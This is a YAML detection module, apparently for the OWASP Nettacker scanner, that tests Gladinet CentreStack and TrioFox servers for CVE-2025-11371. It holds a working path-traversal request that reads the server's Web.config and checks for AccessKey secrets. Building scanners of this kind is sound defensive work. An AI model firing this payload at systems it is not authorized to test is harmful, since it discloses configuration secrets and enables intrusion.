info:
  name: gladinet_centrestack_lfi_cve_2025_11371_vuln
  author: OWASP Nettacker Team
  severity: 6.2
  description: |
    In the default installation and configuration of Gladinet CentreStack and TrioFox,
    there is an unauthenticated Local File Inclusion Flaw that allows unintended
    disclosure of system files. Exploitation of this vulnerability has been observed in the wild. 
    This issue impacts Gladinet CentreStack and Triofox: All versions prior to and including 16.7.10368.56560

  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-11371
    - https://www.huntress.com/blog/gladinet-centrestack-triofox-local-file-inclusion-flaw
    - https://github.com/Kazgangap/cve-poc-garage/blob/main/2025/CVE-2025-11371.md
    - https://thehackernews.com/2025/10/from-lfi-to-rce-active-exploitation.html

  profiles:
    - vuln
    - http
    - cve
    - cve2025
    - gladinet
    - centrestack
    - triofox
    - lfi
    - kev

payloads:
  - library: http
    steps:
      - method: get
        timeout: 5
        headers:
          User-Agent: "{user_agent}"
        allow_redirects: false
        ssl: false
        url:
          nettacker_fuzzer:
            input_format: "{{schema}}://{target}:{{ports}}{{paths}}"
            prefix: ""
            suffix: ""
            interceptors:
            data:
              schema:
                - "http"
                - "https"
              ports:
                - 80
                - 443
              paths:
                - "/storage/t.dn?s=..%5C..%5C..%5CProgram+Files+(x86)%5CGladinet+Cloud+Enterprise%5Croot%5CWeb.config&sid=1"

        response:
          condition_type: and
          conditions:
            status_code:
              regex: "200"
              reverse: false

            headers:
              Content-type:
                regex: "application/octet-stream"
                reverse: false

            content:
              regex: "(?s)(configuration).*?(system\\.web).*?(AccessKey)"
              reverse: false
